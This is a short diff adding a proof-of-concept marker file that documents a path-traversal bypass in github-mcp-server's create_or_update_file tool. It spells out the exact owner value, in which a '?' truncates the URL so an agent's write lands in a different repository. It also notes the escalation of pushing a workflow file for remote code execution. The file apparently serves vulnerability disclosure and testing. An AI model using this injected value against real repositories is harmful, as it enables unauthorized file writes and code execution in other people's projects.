@@ -1,0 +1,27 @@
+=== PATH TRAVERSAL via MCP — QUERY TRUNCATION BYPASS ===
+
+This file was written via github/github-mcp-server's
+create_or_update_file MCP tool.
+
+The agent was told to operate on: mcp-traversal-source
+But this file landed in: mcp-traversal-target
+
+Attack vector: '?' in owner field truncates the URL path.
+  owner = "hawkinsecurity/mcp-traversal-target/contents/pwned.txt?"
+  repo  = "mcp-traversal-source"
+  path  = "decoy.txt"
+
+go-github v85+ checks for '..' segments (checkURLPathTraversal)
+but '?' bypass needs no '..' — it works by URL query injection.
+
+url.Parse splits the URL:
+  Path:  repos/hawkinsecurity/mcp-traversal-target/contents/pwned.txt
+  Query: /mcp-traversal-source/contents/decoy.txt  (ignored)
+
+The PUT request goes to:
+  PUT /repos/hawkinsecurity/mcp-traversal-target/contents/pwned.txt
+
+Timestamp: 2026-11-05T17:05:00Z
+
+Impact: Arbitrary file write to any repo the token can access.
+  → Push .github/workflows/evil.yml = RCE via GitHub Actions
